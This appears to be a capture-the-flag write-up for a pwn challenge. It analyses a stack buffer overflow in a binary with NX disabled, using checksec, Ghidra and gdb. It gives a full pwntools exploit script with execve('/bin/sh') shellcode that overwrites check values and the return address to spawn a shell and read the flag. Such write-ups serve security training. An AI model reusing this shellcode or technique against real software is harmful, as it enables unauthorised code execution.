# &#35; chall_15


#### &#42; purpose
1. find local_4e address
2. overwrite local_44 and local_c with 0xfacade
3. overwrite ret with shellcode address


#### &#42; execute
```bash
## 1 file
$ ls ./chall_15
./chall_15

## 64-bit LSB, dynamically linked and not stripped
$ file ./chall_15
./chall_15: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a0afd41e6ccb7268e337f34a31f195f19e0b3300, for GNU/Linux 3.2.0, not stripped

## Full RELRO and PIE enabled
$ checksec --file=./chall_15
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   69) Symbols	  No	0		2		./chall_15

## just input twice
$ ./chall_15
AAAAAAAA
There's a place where nothing seems: 0x7fffbea5397a
BBBBBBBB
$


```

#### &#42; disassemble using ghidra
```bash
## vulnerable point is fgets(local_4e,90,stdin); in vuln()

void main(void)

{
  char local_28 [32];
  
  fgets(local_28,0x13,stdin);
  vuln();
  return;
}

## vulnerable point is fgets(local_4e,90,stdin);
void vuln(void)

{
  char local_4e [10];
  int local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  int local_c;
  
  printf("There\'s a place where nothing seems: %p\n",local_4e);
  local_c = 0xdead;
  local_10 = 0xdead;
  local_14 = 0xdead;
  local_18 = 0xdead;
  local_1c = 0xdead;
  local_20 = 0xdead;
  local_24 = 0xdead;
  local_28 = 0xdead;
  local_2c = 0xdead;
  local_30 = 0xdead;
  local_34 = 0xdead;
  local_38 = 0xdead;
  local_3c = 0xdead;
  local_40 = 0xdead;
  local_44 = 0xdead;
  fgets(local_4e,90,stdin);
  if ((local_44 != 0xfacade) && (local_c != 0xfacade)) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  return;
}


gef???  x/12xg 0x7fffe1707174
0x7fffe1707174:	0x0000dead0000dead	0x0000dead0000dead
0x7fffe1707184:	0x0000dead0000dead	0x0000dead0000dead
0x7fffe1707194:	0x0000dead0000dead	0x0000dead0000dead
0x7fffe17071a4:	0x0000dead0000dead	0xe17071e00000dead
0x7fffe17071b4:	0xa3fce26800007fff	0x41414141000055fc
0x7fffe17071c4:	0xa3fc000a41414141	0xe17072d0000055fc
gef???  x/xw 0x7fffe17071ad
0x7fffe17071ad:	0xe00000de
gef???  x/xw 0x7fffe17071ac
0x7fffe17071ac:	0x0000dead
gef???  p/d 0x7fffe17071ac-0x7fffe1707174
$1 = 56
gef???


## exploit structure
local_4e[10] + local_c[4] + ..... + local_44[4]
=> local_4e[dummy] + local_c[0xfacade] + shellcode + ... + local_44[0xfacade] + sfp[dummy] + ret[&shellcode]

```


#### &#42; exploit step
```bash
1. get local_4e address
2. make payload
  local_4e [10](dummy) + local_c[4](0xfacade) + shellcode + ..... + local_44[4](0xfacade) + sfp[8] + ret[8](&shellcode)

```



#### &#42; analysis binary using gdb
```bash

gef???  disass main
Dump of assembler code for function main:
   0x0000557dcd95c23f <+0>:	endbr64
   0x0000557dcd95c243 <+4>:	push   rbp
   0x0000557dcd95c244 <+5>:	mov    rbp,rsp
   0x0000557dcd95c247 <+8>:	sub    rsp,0x20
   0x0000557dcd95c24b <+12>:	mov    rdx,QWORD PTR [rip+0x2dbe]        # 0x557dcd95f010 <stdin@@GLIBC_2.2.5>
   0x0000557dcd95c252 <+19>:	lea    rax,[rbp-0x20]
   0x0000557dcd95c256 <+23>:	mov    esi,0x13
   0x0000557dcd95c25b <+28>:	mov    rdi,rax
   0x0000557dcd95c25e <+31>:	call   0x557dcd95c080 <fgets@plt>
   0x0000557dcd95c263 <+36>:	call   0x557dcd95c189 <vuln>
   0x0000557dcd95c268 <+41>:	nop                           => ret address of vuln
   0x0000557dcd95c269 <+42>:	leave
   0x0000557dcd95c26a <+43>:	ret
End of assembler dump.
gef???

gef???  disass vuln
Dump of assembler code for function vuln:
   0x0000558753776189 <+0>:	endbr64
   0x000055875377618d <+4>:	push   rbp
   0x000055875377618e <+5>:	mov    rbp,rsp
   0x0000558753776191 <+8>:	sub    rsp,0x50
   0x0000558753776195 <+12>:	lea    rax,[rbp-0x46]
   0x0000558753776199 <+16>:	mov    rsi,rax
   0x000055875377619c <+19>:	lea    rdi,[rip+0xe65]        # 0x558753777008
   0x00005587537761a3 <+26>:	mov    eax,0x0
   0x00005587537761a8 <+31>:	call   0x558753776070 <printf@plt>
   0x00005587537761ad <+36>:	mov    DWORD PTR [rbp-0x4],0xdead
.
.
.
   0x0000558753776208 <+127>:	mov    rdx,QWORD PTR [rip+0x2e01]        # 0x558753779010 <stdin@@GLIBC_2.2.5>
   0x000055875377620f <+134>:	lea    rax,[rbp-0x46]
   0x0000558753776213 <+138>:	mov    esi,0x5a
   0x0000558753776218 <+143>:	mov    rdi,rax
=> 0x000055875377621b <+146>:	call   0x558753776080 <fgets@plt>
   0x0000558753776220 <+151>:	cmp    DWORD PTR [rbp-0x3c],0xfacade
   0x0000558753776227 <+158>:	je     0x55875377623c <vuln+179>
   0x0000558753776229 <+160>:	cmp    DWORD PTR [rbp-0x4],0xfacade
   0x0000558753776230 <+167>:	je     0x55875377623c <vuln+179>
   0x0000558753776232 <+169>:	mov    edi,0x0
   0x0000558753776237 <+174>:	call   0x558753776090 <exit@plt>
   0x000055875377623c <+179>:	nop
   0x000055875377623d <+180>:	leave
   0x000055875377623e <+181>:	ret
End of assembler dump.
gef???


gef???  b *vuln+146
gef???  r < payload
Starting program: /pwn/sunshine/15/chall_15 < payload
warning: Error disabling address space randomization: Operation not permitted
There's a place where nothing seems: 0x7fff8da725aa

gef???  x/24xg 0x7fff8da725aa
0x7fff8da725aa:	0x000000007fff8da7	0xdead0000dead0000
0x7fff8da725ba:	0xdead0000dead0000	0xdead0000dead0000
0x7fff8da725ca:	0xdead0000dead0000	0xdead0000dead0000
0x7fff8da725da:	0xdead0000dead0000	0xdead0000dead0000
0x7fff8da725ea:	0x26200000dead0000	0x626800007fff8da7
0x7fff8da725fa:	0x4141000055875377	0x000a414141414141
0x7fff8da7260a:	0x2710000055875377	0x000000007fff8da7
0x7fff8da7261a:	0x0000000000000000	0x70b3000000000000
0x7fff8da7262a:	0xc62000007f3dfaff	0x271800007f3dfb1f
0x7fff8da7263a:	0x000000007fff8da7	0x623f000000010000
0x7fff8da7264a:	0x6270000055875377	0xcd13000055875377
0x7fff8da7265a:	0x60a01259e7fe056b	0x2710000055875377
gef???

gef???  x/24xg 0x7fff8da725aa+10
0x7fff8da725b4:	0x0000dead0000dead	0x0000dead0000dead
0x7fff8da725c4:	0x0000dead0000dead	0x0000dead0000dead
0x7fff8da725d4:	0x0000dead0000dead	0x0000dead0000dead
0x7fff8da725e4:	0x0000dead0000dead	0x8da726200000dead
0x7fff8da725f4:	0x5377626800007fff	0x4141414100005587
0x7fff8da72604:	0x5377000a41414141	0x8da7271000005587
0x7fff8da72614:	0x0000000000007fff	0x0000000000000000
0x7fff8da72624:	0xfaff70b300000000	0xfb1fc62000007f3d
0x7fff8da72634:	0x8da7271800007f3d	0x0000000000007fff
0x7fff8da72644:	0x5377623f00000001	0x5377627000005587
0x7fff8da72654:	0x056bcd1300005587	0x537760a01259e7fe
0x7fff8da72664:	0x8da7271000005587	0x0000000000007fff
gef???


```

#### &#42; structure of stack
```bash
1. local_4e[10](dummy) + local_c[4](0xfacade) + ..... + local_44[4](0xfacade) + sfp[8] + ret[8](&shellcode)
2. local_4e[10] + local_c[4](0xfacade) + shellcode + ... + local_44[4](0xfacade) + sfp[8] + ret[8](&local_4e+14)


```

#### &#42; payload(python)
```python
payload  = b""
payload += b"B"*10
payload += p64(0xfacade)
#payload += p64(0xdead)*13
payload += shellcode
payload += b"\x90"*(66-len(payload))
payload += p64(0xfacade)

payload += b"\x90"*(78-len(payload))
payload += p64(buf_addr+14)

```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *

#context.log_level = "debug"

filename = "./chall_15"
conn = process(filename)

conn.sendline("A"*8)

with open("payload", "wb") as fd:
    fd.write("A"*8+"\n")

'''
seems: 0x7ffe787149fa
'''
print( conn.recvuntil("seems: ") )
buf_addr = int(conn.recv(14),16)
print( "buf_addr : " + hex(buf_addr) )

shellcode = b"\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x48\x8D\x3D\xF8\xFF\xFF\xFF\x48\xB9\x2F\x62\x69\x6E\x2F\x73\x68\x00\x48\x89\x0F\x0F\x05"
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

'''
# ret
gef>  p/d 0x7ffc7d98b4c8-0x7ffc7d98b47a
$1 = 78
# 2nd 0xfacade
gef>  x/xg $rbp-0x4
0x7ffecac8f5ec:	0x9090909090909090
gef>  p/d 0x7ffecac8f5ec-0x7ffecac8f5aa
$1 = 66
'''

payload  = b""
payload += b"B"*10
payload += p64(0xfacade)
#payload += p64(0xdead)*13
payload += shellcode
payload += b"\x90"*(66-len(payload))
payload += p64(0xfacade)

payload += b"\x90"*(78-len(payload))
payload += p64(buf_addr+14)

conn.sendline(payload)

with open("payload", "ab") as fd:
    fd.write(payload)


conn.interactive()

```


#### &#42; try to exploit
```bash
$ python2 exp.py
[+] Starting local process './chall_15': pid 1926
There's a place where nothing seems:
buf_addr : 0x7ffde9ad0efa
[*] Switching to interactive mode

$
$ cat flag.txt
sun{bat-country-53036e8a423559df}
$

```
